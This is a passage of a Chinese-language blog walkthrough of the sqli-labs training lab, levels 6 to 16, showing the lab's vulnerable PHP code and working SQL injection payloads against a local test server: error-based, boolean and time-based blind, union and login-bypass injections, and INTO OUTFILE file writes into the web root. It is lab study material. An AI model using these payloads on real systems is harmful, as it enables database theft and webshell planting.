href="https://www.cnblogs.com/c1047509362/p/12806297.html">SQL注入实战之报错注入篇</a></p></li></ul><h3 id="level-6"><a href="#level-6" class="headerlink" title="level-6"></a>level-6</h3><p><strong>布尔&#x2F;报错-双引号-注入</strong><br>改了一下后台显示，方便学习<br>1、测试注入  </p><p>无修饰，id&#x3D;1<br><img src="/2022/02/17/sqli-labs/2022-02-19-16-16-15.png"><br>加单引号，id&#x3D;1’</p><p><img src="/2022/02/17/sqli-labs/2022-02-19-16-23-49.png"><br>对比发现竟然没有报错！</p><p>加双引号，id&#x3D;1”<br><img src="/2022/02/17/sqli-labs/2022-02-19-16-25-52.png"><br>这里可以直观的看到报错原因，以及sql语句和报错信息之间的关系<br>判断为<strong>不显示查询结果的-波尔&#x2F;报错-双引号-注入</strong><br>所以和level-5一样，这里仅爆数据库，剩余不具体展示  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">6</span>/?<span class="built_in">id</span>=<span class="number">1</span><span class="string">&quot;  and updatexml(1,concat(0x7e,(database()),0x7e),1)%23</span></span><br></pre></td></tr></table></figure><p><img src="/2022/02/17/sqli-labs/2022-02-19-16-34-09.png"></p><p>这里就可以做个总结了<br>我们看一下level 1~6 报错和sql语句的联系</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">level-<span class="number">1</span></span><br><span class="line">    raw <span class="built_in">id</span>: <span class="number">1</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">    changed id : 1&#x27;</span></span><br><span class="line">    SELECT * FROM users WHERE <span class="built_in">id</span>=<span class="string">&#x27;1&#x27;</span><span class="string">&#x27; LIMIT 0,1</span></span><br><span class="line"><span class="string">    You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;</span><span class="string">&#x27;1&#x27;</span><span class="string">&#x27; LIMIT 0,1&#x27;</span> at line <span class="number">1</span></span><br><span class="line"></span><br><span class="line">level-<span class="number">2</span></span><br><span class="line">    raw <span class="built_in">id</span>: <span class="number">1</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">    changed id : 1&#x27;</span></span><br><span class="line">    SELECT * FROM users WHERE <span class="built_in">id</span>=<span class="number">1</span><span class="string">&#x27; LIMIT 0,1</span></span><br><span class="line"><span class="string">    You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;</span><span class="string">&#x27; LIMIT 0,1&#x27;</span> at line <span class="number">1</span></span><br><span class="line"></span><br><span class="line">level-<span class="number">3</span></span><br><span class="line">    raw <span class="built_in">id</span>: <span class="number">1</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">    changed id : 1&#x27;</span></span><br><span class="line">    SELECT * FROM users WHERE <span class="built_in">id</span>=(<span class="string">&#x27;1&#x27;</span><span class="string">&#x27;) LIMIT 0,1</span></span><br><span class="line"><span class="string">    You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;</span><span class="string">&#x27;1&#x27;</span><span class="string">&#x27;) LIMIT 0,1&#x27;</span> at line <span class="number">1</span></span><br><span class="line"></span><br><span class="line">level-<span class="number">4</span></span><br><span class="line">    raw <span class="built_in">id</span>: <span class="number">1</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">    changed id : &quot;</span><span class="number">1</span><span class="string">&quot;&quot;</span></span><br><span class="line">    SELECT * FROM users WHERE <span class="built_in">id</span>=(<span class="string">&quot;1&quot;</span><span class="string">&quot;) LIMIT 0,1</span></span><br><span class="line"><span class="string">    You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&quot;</span><span class="number">1</span><span class="string">&quot;&quot;</span>) LIMIT <span class="number">0</span>,<span class="number">1</span><span class="string">&#x27; at line 1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">level-5</span></span><br><span class="line"><span class="string">    raw id: 1&#x27;</span></span><br><span class="line">    changed <span class="built_in">id</span> : <span class="number">1</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">    SELECT * FROM users WHERE id=&#x27;</span><span class="number">1</span><span class="string">&#x27;&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span></span><br><span class="line">    You have an error <span class="keyword">in</span> your SQL syntax; check the manual that corresponds to your MySQL server version <span class="keyword">for</span> the right syntax to use near <span class="string">&#x27;&#x27;</span><span class="number">1</span><span class="string">&#x27;&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span><span class="string">&#x27; at line </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">level-6</span></span><br><span class="line"><span class="string">    raw id: 1&quot;</span></span><br><span class="line"><span class="string">    changed id : &quot;1&quot;&quot;</span></span><br><span class="line"><span class="string">    SELECT * FROM users WHERE id=&quot;1&quot;&quot; LIMIT 0,1</span></span><br><span class="line"><span class="string">    You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;</span><span class="string">&quot;1&quot;</span><span class="string">&quot; LIMIT 0,1&#x27; at line 1</span></span><br></pre></td></tr></table></figure><p>我们记输入id值为raw_id,本后端加工过后的id为changed_id,后端加工函数为change()，报错sql段为sql_error<br>以sqli-labs为例，他们的关系基本是</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sql_error=<span class="string">&#x27;changed_id LIMIT 0，1&#x27;</span>= <span class="string">&#x27;chaged(id) LIMIT 0,1&#x27;</span></span><br></pre></td></tr></table></figure><p>我们从此可以推断sql语句的id部分。</p><h3 id="level-7"><a href="#level-7" class="headerlink" title="level-7"></a>level-7</h3><p><strong>布尔-双括号-单引号-注入</strong><br>没有回显，只有对或错，尝试，无解，上sqlmap，sqlmap真强大！<br><img src="/2022/02/17/sqli-labs/2022-02-19-17-38-55.png"><br>看看后台</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//including the Mysql connect parameters.</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;../sql-connections/sql-connect.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">// take the variables</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="comment">//logging the connection parameters to a file for analysis.</span></span><br><span class="line"><span class="variable">$fp</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;result.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>,<span class="string">&#x27;ID:&#x27;</span>.<span class="variable">$id</span>.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// connectivity </span></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=((&#x27;<span class="subst">$id</span>&#x27;)) LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;You are in.... Use outfile......&#x27;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;You have an error in your SQL syntax&#x27;</span>;</span><br><span class="line"><span class="comment">//print_r(mysql_error());</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;  </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123; <span class="keyword">echo</span> <span class="string">&quot;Please input the ID as parameter with numeric value&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>双括号，还没有回显，那只能sqlmap了。<br>假设试出了双括号，设置 <code>id=-1&#39;))</code>，那就可以布尔盲注入了，具体参考level-5布尔注入<br>这里只测试库名长度</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">7</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&#x27;)) or 1=1%23  成功通过，存在布尔注入</span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli-labs/Less-7/?id=-1&#x27;</span>)) <span class="keyword">or</span> length(database())=<span class="number">8</span>%<span class="number">23</span>  得到库名长度</span><br></pre></td></tr></table></figure><p>根据名字提示可以写入木马文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">7</span>/?<span class="built_in">id</span>=<span class="number">1</span><span class="string">&#x27;)) union select 1,0x74657374,3 into outfile &quot;D:\\phpstudy\\PHPTutorial\\WWW\\sqli-labs\\Less-7\\test.php&quot; %23</span></span><br></pre></td></tr></table></figure><p><code>0x74657374</code>是<code>test</code>的ascii，结果如下：<br><img src="/2022/02/17/sqli-labs/2022-02-20-10-10-51.png"><br>提示：<br>mysql写入文件需要打开secure_file_priv</p><ul><li><p>ure_file_priv的值为null ，表示限制mysqld 不允许导入|导出</p></li><li><p>当secure_file_priv的值为&#x2F;tmp&#x2F; ，表示限制mysqld 的导入|导出只能发生在&#x2F;tmp&#x2F;目录下</p></li><li><p>当secure_file_priv的值没有具体值时，表示不对mysqld 的导入|导出做限制</p></li></ul><p>windows下：修改my.ini 在[mysqld]内加入secure_file_priv &#x3D;</p><p>linux下：修改my.cnf 在[mysqld]内加入secure_file_priv &#x3D;<br>然后重启mysql即可</p><p><strong>参考：</strong> </p><ul><li><a href="https://segmentfault.com/a/1190000009333563">MYSQL新特性secure_file_priv对读写文件的影响</a>  </li><li><a href="https://shockerli.net/post/mysql-secure-file-priv/">MySQL 全局配置 –secure-file-priv</a>  </li><li><a href="https://www.cnblogs.com/tangjf10/p/12602116.html">sqli-labs：Less-7</a></li></ul><h3 id="level-8"><a href="#level-8" class="headerlink" title="level-8"></a>level-8</h3><p><strong>单引号-盲注</strong><br>爆字段数  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">8</span>/?<span class="built_in">id</span>=<span class="number">1</span><span class="string">&#x27;  order by 3%23</span></span><br><span class="line"><span class="string">```  </span></span><br><span class="line"><span class="string">1、文件写入  </span></span><br><span class="line"><span class="string">原理同`level-7`</span></span><br><span class="line"><span class="string">``` python</span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli-labs/Less-8/?id=1&#x27;</span>  union select <span class="number">1</span>,<span class="number">0x74657374</span>,<span class="number">3</span> into outfile <span class="string">&quot;D:\\phpstudy\\PHPTutorial\\WWW\\sqli-labs\\Less-8\\test.php&quot;</span> %<span class="number">23</span></span><br></pre></td></tr></table></figure><p>2、布尔注入<br>原理同level-5，仅测试库名长度，不具体展示</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">8</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&#x27; or length(database())=8  %23</span></span><br></pre></td></tr></table></figure><h3 id="level-9"><a href="#level-9" class="headerlink" title="level-9"></a>level-9</h3><p><strong>基于时间-单引号-布尔-注入&#x2F;文件写入</strong><br>1、基于时间的布尔注入<br>原理类似于基于报错，这里只一个爆数据库长度的语句</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">9</span>/?<span class="built_in">id</span>=<span class="number">1</span><span class="string">&#x27; and if((length(database())=8),sleep(2),null) %23</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli-labs/Less-9/?id=1&#x27;</span> <span class="keyword">and</span> <span class="keyword">if</span>((payload),sleep(<span class="number">2</span>),null) %<span class="number">23</span></span><br></pre></td></tr></table></figure><p>2、文件写入<br>可以先用布尔盲注测出当前表的字段数，然后使用union写如文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hhttp://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">9</span>/?<span class="built_in">id</span>=<span class="number">1</span><span class="string">&#x27;  union select 1,0x74657374,3 into outfile &quot;D:\\phpstudy\\PHPTutorial\\WWW\\sqli-labs\\Less-9\\test.php&quot; %23</span></span><br></pre></td></tr></table></figure><p>本来想用下面语句中的payload写入文件，但是一直不成功，理解为<code>into outfile PATH</code>是最后结果的输出，不能用在语句中间，所以还是要结合<code>union</code>联合输出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">9</span>/?<span class="built_in">id</span>=<span class="number">1</span><span class="string">&#x27; and if(1,(payload),null) %23</span></span><br></pre></td></tr></table></figure><h3 id="level-10"><a href="#level-10" class="headerlink" title="level-10"></a>level-10</h3><p><strong>基于时间-双引号-布尔-注入&#x2F;文件写入</strong><br>同level-9，不过换成双引号了，不细致展开</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">10</span>/?<span class="built_in">id</span>=<span class="number">1</span><span class="string">&quot; and if((length(database())=8),sleep(2),null)%23</span></span><br></pre></td></tr></table></figure><h3 id="level-11"><a href="#level-11" class="headerlink" title="level-11"></a>level-11</h3><p><strong>POST型-单引号-有回显-注入</strong>  </p><p>简单测试一下<br>username&#x3D;a’,password&#x3D;b’<br><code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;b&#39;&#39; LIMIT 0,1&#39; at line 1</code><br>可以猜出后台的语句就是很直接的那种，查看后台代码，确实</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">   <span class="variable">$uname</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>];</span><br><span class="line"><span class="variable">$passwd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//logging the connection parameters to a file for analysis.</span></span><br><span class="line"><span class="variable">$fp</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;result.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>,<span class="string">&#x27;User Name:&#x27;</span>.<span class="variable">$uname</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>,<span class="string">&#x27;Password:&#x27;</span>.<span class="variable">$passwd</span>.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// connectivity </span></span><br><span class="line">@<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username=&#x27;<span class="subst">$uname</span>&#x27; and password=&#x27;<span class="subst">$passwd</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br></pre></td></tr></table></figure><p>类似于level-1，闭合语句就可以<br>burp抓包测试<br>爆字段数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">post数据</span><br><span class="line">uname=<span class="number">1</span><span class="string">&#x27;or 1 order by 1 #&amp;passwd=b&amp;submit=Submit  爆出字段数2</span></span><br><span class="line"><span class="string">后端加工之后</span></span><br><span class="line"><span class="string">SELECT username, password FROM users WHERE username=&#x27;</span><span class="number">1</span><span class="string">&#x27;or 1 order by 1 #&#x27;</span> <span class="keyword">and</span> password=<span class="string">&#x27;b&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span> 成功绕过</span><br></pre></td></tr></table></figure><p>爆数据库</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">post数据</span><br><span class="line">uname=-<span class="number">1</span><span class="string">&#x27; union select 1,2 #&amp;passwd=b&amp;submit=Submit</span></span><br><span class="line"><span class="string">后端加工后</span></span><br><span class="line"><span class="string">SELECT username, password FROM users WHERE username=&#x27;</span>-<span class="number">1</span><span class="string">&#x27; union select 1,2 #&#x27;</span> <span class="keyword">and</span> password=<span class="string">&#x27;b&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span> </span><br><span class="line">回显，可以看书<span class="number">1</span>，<span class="number">2</span>都可利用</span><br><span class="line">&lt;br&gt;Your Login name:<span class="number">1</span>&lt;br&gt;Your Password:<span class="number">2</span>&lt;br&gt;</span><br></pre></td></tr></table></figure><p>后面同理前面的level，不细致展开了</p><h3 id="level-12"><a href="#level-12" class="headerlink" title="level-12"></a>level-12</h3><p><strong>POST型-双引号-单括号-有回显-注入</strong><br>简单测试<br><code>uname=a&quot;&amp;passwd=b&#39;#&amp;submit=Submit</code><br>回显,根据之前总结的规律，看出就是id加双引号加单括号，用a验证，看了后台确实是<br><code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;b&#39;#&quot;) LIMIT 0,1&#39; at line 1</code><br>爆字段数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST data</span><br><span class="line">uname=a<span class="string">&quot;)or 1 order by 1#&amp;passwd=b&#x27;#&amp;submit=Submit 爆出字段数为2</span></span><br><span class="line"><span class="string">后端sql</span></span><br><span class="line"><span class="string">SELECT username, password FROM users WHERE username=(&quot;</span>a<span class="string">&quot;)or 1 order by 1#&quot;</span>) <span class="keyword">and</span> password=(<span class="string">&quot;b&#x27;#&quot;</span>) LIMIT <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure><p>查看可利用字段，爆数据库名 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST data</span><br><span class="line">uname=a&quot;) union select 1,database()#&amp;passwd=b&#x27;#&amp;submit=Submit</span><br></pre></td></tr></table></figure><p>下面就和前面的level一样了，不细致展开了</p><h3 id="level-13"><a href="#level-13" class="headerlink" title="level-13"></a>level-13</h3><p><strong>POST型-双引号-单括号-无回显-布尔&#x2F;报错注入</strong><br>分析报错</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST data</span><br><span class="line">uname=a<span class="string">&#x27;&amp;passwd=b&#x27;</span><span class="comment">#&amp;submit=Submit</span></span><br><span class="line">回显，根据规律得出，后端加单引号，单括号</span><br><span class="line">You have an error <span class="keyword">in</span> your SQL syntax; check the manual that corresponds to your MySQL server version <span class="keyword">for</span> the right syntax to use near <span class="string">&#x27;b&#x27;</span><span class="string">&#x27;) LIMIT 0,1&#x27;</span> at line <span class="number">1</span></span><br></pre></td></tr></table></figure><p>所以和之前一样了   </p><p>1、报错注入<br><strong>floor</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST data</span><br><span class="line">uname=<span class="number">1</span><span class="string">&#x27;) or (select 1 from (select count(*),concat(0x7e,(database()),0x7e,floor (rand(0)*2))x from information_schema.tables group by x)a)#&amp;passwd=q&amp;submit=Submit</span></span><br><span class="line"><span class="string">回显，具体不展开和之前一样</span></span><br><span class="line"><span class="string">Duplicate entry &#x27;</span>~security~<span class="number">1</span><span class="string">&#x27; for key &#x27;</span>group_key<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p><strong>updatexml</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST data</span><br><span class="line">uname=<span class="number">1</span><span class="string">&#x27;) or updatexml(1,concat(0x7e,(database()),0x7e),1)#&amp;passwd=q&amp;submit=Submit</span></span><br><span class="line"><span class="string">回显</span></span><br><span class="line"><span class="string">XPATH syntax error: &#x27;</span>~security~<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p><strong>extractvalue</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST data</span><br><span class="line">uname=<span class="number">1</span><span class="string">&#x27;) or extractvalue(1, concat(0x7e,(database()),0x7e))#&amp;passwd=q&amp;submit=Submit</span></span><br><span class="line"><span class="string">回显</span></span><br><span class="line"><span class="string">XPATH syntax error: &#x27;</span>~security~<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p>2、布尔注入<br>仅作库名长度演示</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST data</span><br><span class="line">uname=<span class="number">1</span><span class="string">&#x27;) or length(database())=8#&amp;passwd=q&amp;submit=Submit</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">回显，这里查看源码成功的图片名是/images/flag.jpg，失败的为 /images/slap.jpg</span></span><br><span class="line"><span class="string">可以根据文件名逐一爆破，不一一展开，和之前一样。</span></span><br></pre></td></tr></table></figure><h3 id="level-14"><a href="#level-14" class="headerlink" title="level-14"></a>level-14</h3><p><strong>POST型-双引号-无回显-布尔&#x2F;报错注入</strong>   </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST data</span><br><span class="line">uname=<span class="number">1</span><span class="string">&quot;&amp;passwd=2&amp;submit=Submit</span></span><br><span class="line"><span class="string">回显，推断后端加了双引号</span></span><br><span class="line"><span class="string">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;2&quot;</span> LIMIT <span class="number">0</span>,<span class="number">1</span><span class="string">&#x27; at line 1</span></span><br></pre></td></tr></table></figure><p>和level-13原理一样，只是后端少加了单括号，不细致展开。</p><h3 id="level-15"><a href="#level-15" class="headerlink" title="level-15"></a>level-15</h3><p><strong>POST型-单引号-无回显-布尔&#x2F;时间盲注&#x2F;文件写入</strong><br>这里发现可以布尔注入就一定可以时间盲注，这里因为成功&#x2F;失败图片名不一样，用布尔更快一些<br>猜测后台加工：加单引号，测试<code>username=a&#39; or 1#</code> ，回显成功<br>1、布尔&#x2F;时间盲注</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST data </span><br><span class="line">布尔：</span><br><span class="line">uname=a<span class="string">&#x27; or length(database())=8#&amp;passwd=a&amp;submit=Submit</span></span><br><span class="line"><span class="string">时间盲注：</span></span><br><span class="line"><span class="string">uname=a&#x27;</span> <span class="keyword">or</span> <span class="keyword">if</span>((length(database())=<span class="number">8</span>),sleep(<span class="number">2</span>),null)<span class="comment">#&amp;passwd=a&amp;submit=Submit</span></span><br></pre></td></tr></table></figure><p>2、文件写入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST data</span><br><span class="line">uname=a<span class="string">&#x27; union select 1,0x7e into outfile &quot;D:\\phpstudy\\PHPTutorial\\WWW\\sqli-labs\\Less-15\\test.txt&quot;#&amp;passwd=a&amp;submit=Submit</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">test.txt内容</span></span><br><span class="line"><span class="string">1~</span></span><br></pre></td></tr></table></figure><p>具体不展开，和之前一样</p><h3 id="level-16"><a href="#level-16" class="headerlink" title="level-16"></a>level-16</h3><p><strong>POST型-双引号-单括号-无回显-布尔&#x2F;时间盲注&#x2F;文件写入</strong><br>同level-15，把id改一下即可，后端加工为 添加 <code>&quot;)</code>，不具体展开了</p><h3 id="level-17"><a href="#level-17" class="headerlink" title="level-17"></a>level-17</h3><h1 id="Advanced"><a href="#Advanced" class="headerlink" title="Advanced"></a>Advanced</h1><h3 id="level"><a href="#level" class="headerlink" title="level"></a>level</h3><h2 id="Challenges"><a href="#Challenges" class="headerlink" title="Challenges"></a>Challenges</h2><h3 id="level-1"><a href="#level-1" class="headerlink" title="level"></a>level</h3>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2022/02/17/hello-world/"/>
      <url>/2022/02/17/hello-world/</url>
      
